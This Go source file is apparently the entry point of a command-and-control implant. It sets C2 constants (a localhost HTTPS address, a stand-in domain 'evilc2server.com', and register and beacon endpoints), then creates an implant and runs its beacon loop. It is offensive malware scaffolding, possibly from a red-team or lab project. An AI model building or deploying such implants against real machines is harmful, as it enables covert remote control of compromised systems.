package main

import (
	"math/rand"
	"time"
)

const (
	C2HTTPSURI            = "https://localhost"
	C2DNSDOMAIN           = "evilc2server.com"
	C2REGISTERENDPOINT    = "/implant/register"
	C2HTTPSBEACONENDPOINT = "/implant/beacon"
)

func init() {
	// TODO: fix - Seed is depricated
	rand.Seed(time.Now().UnixNano())
}

func main() {
	implant, err := NewImplant()
	if err != nil {
		panic(err)
	}
	err = implant.BeaconLoop()
	if err != nil {
		panic(err)
	}
}
